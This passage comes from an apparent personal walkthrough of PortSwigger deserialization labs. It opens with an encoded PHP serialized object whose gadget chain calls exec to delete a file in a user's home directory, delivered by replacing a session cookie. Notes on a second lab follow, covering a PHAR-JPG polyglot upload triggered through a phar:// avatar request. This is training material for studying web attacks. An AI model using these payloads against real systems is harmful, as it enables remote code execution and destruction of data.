%54%7a%6f%78%4e%44%6f%69%51%33%56%7a%64%47%39%74%56%47%56%74%63%47%78%68%64%47%55%69%4f%6a%49%36%65%33%4d%36%4d%54%63%36%49%6d%52%6c%5a%6d%46%31%62%48%52%66%5a%47%56%7a%59%31%39%30%65%58%42%6c%49%6a%74%7a%4f%6a%49%32%4f%69%4a%79%62%53%41%76%61%47%39%74%5a%53%39%6a%59%58%4a%73%62%33%4d%76%62%57%39%79%59%57%78%6c%4c%6e%52%34%64%43%49%37%63%7a%6f%30%4f%69%4a%6b%5a%58%4e%6a%49%6a%74%50%4f%6a%45%77%4f%69%4a%45%5a%57%5a%68%64%57%78%30%54%57%46%77%49%6a%6f%78%4f%6e%74%7a%4f%6a%67%36%49%6d%4e%68%62%47%78%69%59%57%4e%72%49%6a%74%7a%4f%6a%51%36%49%6d%56%34%5a%57%4d%69%4f%33%31%39

Go to:

GET / HTTP/1.1

Replace the cookie: session= with the new-found cookie

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601010952.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601011011.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601011030.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601011048.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601010631.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601010656.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601011648.png)

### Using PHAR deserialization to deploy a custom gadget chain
```bash

# This lab does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.

# To solve the lab, delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: Target -> Site map -> right-click current-website.com -> Engagement tools -> Discover content -> Session is not running
Find:

GET /cgi-bin/Blog.php~ HTTP/1.1

GET /cgi-bin/CustomTemplate.php~ HTTP/1.1

Note:

"php-twig-1.19"

Google:

"php-twig-1.19 exploit"

https://www.exploit-db.com/exploits/44102

"Twig < 2.4.4 - Server Side Template Injection"

No concrete polyglot guide... I recall having a solid Tryhackme room on the matter.
Anyways, refer to the solution polyglot created...

https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg

Upload said polyglot
Go to:

GET /cgi-bin/avatar.php?avatar=phar://wiener HTTP/1.1

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601014442.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601014505.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601014542.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601014740.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220601020246.png)

#hacking
